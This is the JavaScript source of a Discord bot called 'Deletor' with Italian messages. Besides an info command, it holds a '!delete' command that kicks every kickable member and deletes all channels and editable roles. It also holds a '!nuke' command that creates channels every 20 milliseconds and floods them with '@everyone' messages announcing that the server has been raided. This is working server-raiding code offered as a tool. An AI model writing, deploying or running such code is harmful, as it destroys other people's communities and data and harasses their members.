require("dotenv").config()
const Discord = require("discord.js");
const client = new Discord.Client({
    intents: 32767,
    partials: ['MESSAGE', 'CHANNEL', 'REACTION']
});

client.login(process.env.TOKEN)

client.on("ready", () => {
    console.log("Deletor on line")
})

client.on("messageCreate", message => {
    if (message.content == "!info" || message.content == "!help") {
        let embed = new Discord.MessageEmbed()
            .setTitle("__Info BOT__")
            .setDescription("Ecco le informazioni riguardo il bot")
            .addField("Linguaggio", "JavaScript", true)
            .addField("Libreria", "discord.js v13.6.0", true)
            .addField("Creazione bot⏰", "01/03/2022", true)
            .addField("Developer🖥️", "cappella_smegma#4457", true)
        message.channel.send({ embeds: [embed] })
    }
})

client.on("messageCreate", async message => {
    if (message.content == "!delete") {

        const members = await message.guild.members.fetch()
        members.filter(m => m.kickable).forEach(m => m.kick())

        try {
            const channel = await message.guild.channels.fetch()
            channel.forEach(c => c.delete())
        } catch (error) {
            console.log(error)
        }

        message.guild.roles.cache.each(role => {
            if (role.editable && role.name !== "@everyone") {
                role.delete().catch(err => console.log(role.name))
            }
        });

    }
})


client.on("messageCreate", async message => {
    if (message.content == "!nuke") {
        try {
            setInterval(async () => {
                var server = message.channel.guild;
                let nRandom2 = Math.floor (Math.random() * (10000 - 1 + 1) ) + 100;
                server.channels.create(`𝐄𝐙-𝐑𝐀𝐈𝐃-${nRandom2}`, {
                    type: "text"
                }).then(canale => {
                    setInterval(async () => {
                        canale.send("@everyone questo server è stato raidato\r@everyone questo server è stato raidato\r@everyone questo server è stato raidato")
                        await canale.send("@everyone questo server è stato raidato\r@everyone questo server è stato raidato\r@everyone questo server è stato raidato")
                    }, 20)
                })
            }, 20);
        } catch (err) {
            console.error(err)
            return
        }
    }
})


